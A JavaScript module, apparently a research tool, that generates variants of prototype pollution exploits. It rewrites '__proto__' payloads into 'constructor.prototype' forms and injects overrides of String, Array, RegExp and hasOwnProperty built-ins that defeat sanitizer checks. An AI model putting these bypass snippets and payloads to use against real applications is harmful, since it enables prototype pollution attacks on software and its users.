const ast_replacer = require("../ast_modifiers/ast_replacer")
const object_replacer = require("../ast_modifiers/object_replacer")
const ast_adder = require("../ast_modifiers/ast_adder")
const path = require("path")
const fs = require("fs");

let file_name_count = 1

function createFile(filePath,code){
    // path handling 
    const dir = path.dirname(filePath);
    const fullBase = path.basename(filePath); 

    // Split at first dot
    const dotIndex = fullBase.indexOf(".");
    let base, restExt;
    if (dotIndex !== -1) {
      base = fullBase.slice(0, dotIndex);
      restExt = fullBase.slice(dotIndex);
    } else {
      base = fullBase;
      restExt = "";
    }

    const outPath = path.join(dir, `${base}_${file_name_count}${restExt}`);
    if(fs.existsSync(outPath)){
      file_name_count++;
      createFile(filePath,code)
    }else{
      fs.writeFileSync(outPath, code, "utf-8");
    }
    file_name_count++;
}

function variant_caller(arr,filePath){
  
  const code_to_be_added1 = `
    String.prototype.includes = () => false;
    String.prototype.startsWith = () => false;
    String.prototype.endsWith = () => false;
    String.prototype.indexOf = () => -1;
    String.prototype.lastIndexOf = () => false;
    String.prototype.match = () => false;
    String.prototype.search = () => false;
    String.prototype.matchAll = () => false;

    Array.prototype.includes = () => false;
	  Array.prototype.indexOf = () => -1
    `;

  const code_to_be_added2 = `
    Array.prototype.includes = function(key){
			  if(key == "__proto__" || key == "constructor" || key == "prototype" || key == "polluted"){
				return false
			  }else{
				return true
			  }
			};`

  const code_to_be_added3 = `Object.prototype.hasOwnProperty.call = () => true;`
  const code_to_be_added4 = `Object.prototype.hasOwnProperty = () => true;`
  const code_to_be_added5 = `RegExp.prototype.test = () => false;`
  const code_to_be_added6 = `Reflect.getPrototypeOf = () => false;`
  const code_to_be_added7 = `
  var arg = ['__proto__'];
	var flag1 = true 
	arg.toString = function(){
		if(flag1){
		  flag1 = false 
		  return 'foo'
		}else{
		  return '__proto__'
		}
		
	  }

	String.prototype.split = function(){
	  return [arg, 'polluted']
	}`

  const code_to_be_added8 = `
  var arg1 = ['constructor'];
	var arg2 = ['prototype'];
	var flag1 = true 
	var flag2 = true 
	arg1.toString = function(){
		if(flag1){
		  flag1 = false 
		  return 'foo'
		}else{
		  return 'constructor'
		}
		
	  }
	  
	arg2.toString = function(){
		if(flag2){
		  flag2 = false 
		  return 'foo'
		}else{
		  return 'prototype'
		}
		
	  }

	String.prototype.split = function(){
	  return [arg1, arg2, 'polluted']
	}`

  const code_to_be_added9 = `
  var obj = {}
		obj.__proto__.polluted = undefined;
		Object.defineProperty(obj, "__proto__", {
		  value: obj.__proto__,
		  writable: true,
		  enumerable: true,
		  configurable: true
		});
  `

  const code_to_be_added10 = `
  var obj = {}
  obj.constructor.prototype.polluted = undefined;
  Object.defineProperty(obj, "constructor", {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
  });
  `
  const code_to_be_added11 = `RegExp.prototype.test = () => true;`

  for(let i=0; i < arr.length; i++){
    const og_code = arr[i]
    //console.log(i)
    try{
      createFile(filePath,ast_adder(code_to_be_added1,og_code))
      createFile(filePath,ast_adder(code_to_be_added2,og_code))
      createFile(filePath,ast_adder(code_to_be_added3,og_code))
      createFile(filePath,ast_adder(code_to_be_added4,og_code))
      createFile(filePath,ast_adder(code_to_be_added5,og_code))
      createFile(filePath,ast_adder(code_to_be_added6,og_code))
      createFile(filePath,ast_adder(code_to_be_added7,og_code))
      createFile(filePath,ast_adder(code_to_be_added8,og_code))
      createFile(filePath,object_replacer(code_to_be_added9,og_code))
      createFile(filePath,object_replacer(code_to_be_added10,og_code))
      createFile(filePath,ast_adder(code_to_be_added11,og_code))
      createFile(filePath,ast_adder(code_to_be_added11,og_code))
 
    }catch(e){
      continue
    }
  }
}

function template_literal_handler(filePath,code,value,type="template_literal"){

  const regex1 = /^__proto__\.([a-zA-Z_$][a-zA-Z0-9_$]*)$/;           //__proto__.some-string
  const regex2 = /^\s*\{\s*"__proto__"\s*:\s*\{\s*"([^"]+)"\s*:\s*"([^"]+)"\s*\}\s*\}\s*$/;    //  {"__proto__": {some_string:some_other_string}}}
  const regex3 = /^\s*\{\s*"([^"]+)"\s*:\s*\{\s*"__proto__"\s*:\s*\{\s*"([^"]+)"\s*:\s*"([^"]+)"\s*\}\s*\}\s*\}\s*$/;  //  {some_string: {"__proto__": {some_other_string:another_string}}}}
  const regex4 = /^\/__proto__\/(.+)$/;   //  /__proto__/<some-string>
  const regex5 = /^__proto__\/(.+)$/;     // __proto__/<some-string>
  const regex6 = /^__proto__\[\s*([^\]]+)\s*\]\s*=\s*(.+)$/;  // __proto__[some_string]=some_other_string
  const regex7 = /^__proto__\[\s*([^\]]+)\s*\]$/;   // __proto__[some_string]
  const regex8 = /^\[\s*__proto__\/(.+?)\s*\]$/;    // [__proto__/some-string]
  const regex9 = /^\[\s*__proto__\s*,\s*(.+?)\s*\]$/;   // [__proto__,<some-str>]
  const regex10 = /^\[\s*["']__proto__["']\s*,\s*["'](.+?)["']\s*\]$/; // ["__proto__","<some-str>""]
  const regex11 = /^\[\s*__proto__\s*\]\s*\n\s*([a-zA-Z_$][a-zA-Z0-9_$]*)\s*=\s*(.+)$/;   // [__proto__]\n<some-str>=<some-other-str>
  const regex12 = /\{\{\s*__proto__\.([a-zA-Z_$][a-zA-Z0-9_$]*)\s*=\s*([^\}]+)\s*\}\}/;   // {{__proto__.polluted=yes}}
  const regex13 = /\{\{\s*__proto__\.([a-zA-Z_$][a-zA-Z0-9_$]*)\s*=\s*"([^"]+)"\s*\}\}/;  // {{__proto__.polluted="yes"}}
  const regex14 = /^([a-zA-Z_$][a-zA-Z0-9_$]*)\.__proto__\.([a-zA-Z_$][a-zA-Z0-9_$]*)$/;  // some-str.__proto__.some-other-str
  const regex15 = /__proto__\.([a-zA-Z_$][a-zA-Z0-9_$]*)\s*=\s*([^\s;]+)/;  // __proto__.str1=str2
  const regex16 = /__proto__%(.{2})(.+)%(.{2})=(.+)/  // __proto__%<hex><some-str>%<hex-2>=<some-other-string>
  const regex17 = /__proto__(.)(.+)/  // __proto__<single-char><some-string>
  
  // only regex2 is needed, but everything is included anyway 
  if(value == "__proto__"){
    if(type == "template_literal"){
      var code1 = ast_replacer("template_literal","__proto__","constructor.prototype",code)
      var code2 = ast_replacer("template_literal","__proto__",["'constructor'","'prototype'"],code)
      createFile(filePath,code1)
      createFile(filePath,code2)
      variant_caller([code1,code2,code],filePath)
    }else if(type == "object_value"){
      var code1 = ast_replacer("object_value","__proto__","constructor.prototype",code)
      createFile(filePath,code1)
      variant_caller([code1,code],filePath)
    }
    
  }else if(regex1.test(value)){
    var match = value.match(regex1);
    var some_string = match[1];

    var code1 = ast_replacer("template_literal",value,"constructor.prototype." + some_string, code)
    createFile(filePath,code1)
    variant_caller([code1,code],filePath)
  
  }else if(regex2.test(value)){
    var match = value.match(regex2);
    var some_string = match[1];
    var some_other_string = match[2];

    var code1 = ast_replacer("template_literal",value,`{"constructor": {"prototype": {"${some_string}":"${some_other_string}"}}}`, code)
    var code2 = ast_replacer("template_literal",value,`{"constructor.prototype": {"${some_string}":"${some_other_string}"}}`, code)
    createFile(filePath,code1)
    createFile(filePath,code2)
    variant_caller([code1,code2,code],filePath)

  }else if(regex3.test(value)){
    var match = value.match(regex3);
    var some_string = match[1];
    var some_other_string = match[2];
    var another_string = match[3]

    var code1 = ast_replacer("template_literal",value,`{"${some_string}": {"constructor": {"prototype": {"${some_other_string}":"${another_string}"}}}}`, code)
    var code2 = ast_replacer("template_literal",value,`{"${some_string}": {"constructor.prototype": {"${some_other_string}":"${another_string}"}}}`, code)
    createFile(filePath,code1)
    createFile(filePath,code2)
  }else if(regex4.test(value)){
    var match = value.match(regex4);
    var some_string = match[1];

    var code1 = ast_replacer("template_literal",value,`/constructor/prototype/${some_string}`, code)
    createFile(filePath,code1)
  }else if(regex5.test(value)){
    var match = value.match(regex5);
    var some_string = match[1];

    var code1 = ast_replacer("template_literal",value,`constructor/prototype/${some_string}`, code)
    createFile(filePath,code1)
  }else if(regex6.test(value)){
    var match = value.match(regex6);
    var some_string = match[1];
    var some_other_string = match[2]

    var code1 = ast_replacer("template_literal",value,`constructor.prototype[${some_string}]=${some_other_string}`, code)
    var code2 = ast_replacer("template_literal",value,`constructor[prototype][${some_string}]=${some_other_string}`, code)
    createFile(filePath,code1)
    createFile(filePath,code2)
  }else if(regex7.test(value)){
    var match = value.match(regex7);
    var some_string = match[1];

    var code1 = ast_replacer("template_literal",value,`constructor.prototype[${some_string}]`, code)
    var code2 = ast_replacer("template_literal",value,`constructor[prototype][${some_string}]`, code)
    createFile(filePath,code1)
    createFile(filePath,code2)
  }else if(regex8.test(value)){
    var match = value.match(regex8);
    var some_string = match[1];

    var code1 = ast_replacer("template_literal",value,`[constructor.prototype/${some_string}]`, code)
    var code2 = ast_replacer("template_literal",value,`[constructor/prototype/${some_string}]`, code)
    createFile(filePath,code1)
    createFile(filePath,code2)
  }else if(regex9.test(value)){
    var match = value.match(regex9);
    var some_string = match[1];

    var code1 = ast_replacer("template_literal",value,`[constructor.prototype,${some_string}]`, code)
    var code2 = ast_replacer("template_literal",value,`[constructor,prototype,${some_string}]`, code)
    createFile(filePath,code1)
    createFile(filePath,code2)
  }else if(regex10.test(value)){
    var match = value.match(regex10);
    var some_string = match[1];

    var code1 = ast_replacer("template_literal",value,`["constructor.prototype","${some_string}"]`, code)
    var code2 = ast_replacer("template_literal",value,`["constructor","prototype","${some_string}"]`, code)
    createFile(filePath,code1)
    createFile(filePath,code2)
  }else if(regex11.test(value)){
    var match = value.match(regex11);
    var some_string = match[1];
    var some_other_string = match[2];

    var code1 = ast_replacer("template_literal",value,`[constructor.prototype]\n${some_string}=${some_other_string}`, code)
    var code2 = ast_replacer("template_literal",value,`[constructor][prototype]\n${some_string}=${some_other_string}`, code)
    createFile(filePath,code1)
    createFile(filePath,code2)
  }else if(regex12.test(value)){
    var match = value.match(regex12);
    var some_string = match[1];
    var some_other_string = match[2];


    var code1 = ast_replacer("template_literal",value,`{{constructor.prototype.${some_string}=${some_other_string}}}`, code)
    createFile(filePath,code1)
  }else if(regex13.test(value)){
    var match = value.match(regex13);
    var some_string = match[1];
    var some_other_string = match[2];

    var code1 = ast_replacer("template_literal",value,`{{constructor.prototype.${some_string}="${some_other_string}"}}`, code)
    createFile(filePath,code1)
  }else if(regex14.test(value)){
    var match = value.match(regex14);
    var some_string = match[1];
    var some_other_string = match[2];

    var code1 = ast_replacer("template_literal",value,`${some_string}.constructor.prototype.${some_other_string}`, code)
    createFile(filePath,code1)
  }else if(regex15.test(value)){
    var match = value.match(regex15);
    var some_string = match[1];
    var some_other_string = match[2];

    var code1 = ast_replacer("string_literal",value,`constructor.prototype.${some_string}=${some_other_string}`, code)
    createFile(filePath,code1)
  }else if(regex16.test(value)){
    var match = value.match(regex16);
    var hex1 = match[1];
    var some_string = match[2];
    var hex2 = match[3];
    var some_other_string = match[4];

    var code1 = ast_replacer("string_literal",value,`constructor.prototype%${hex1}${some_string}%${hex2}=${some_other_string}`, code)
    var code2 = ast_replacer("string_literal",value,`constructor%${hex1}prototype%${hex1}${some_string}%${hex2}=${some_other_string}`, code)
    createFile(filePath,code1)
    createFile(filePath,code2)
  } else if(regex17.test(value)){
    var match = value.match(regex17);
    var single_char = match[1];
    var some_string = match[2];

    var code1 = ast_replacer("string_literal",value,`constructor.prototype${single_char}${some_string}`, code)
    var code2 = ast_replacer("string_literal",value,`constructor${single_char}prototype${single_char}${some_string}`, code)
    createFile(filePath,code1)
    createFile(filePath,code2)
  } else if("__proto__" in value){  //when all else fails simply replace __proto__ with constructor.prototype
    let replacement = value.replace("__proto__", "constructor.prototype");
    var code1 = ast_replacer("string_literal",value,replacement, code)
    createFile(filePath,code1)
  }

}

module.exports = template_literal_handler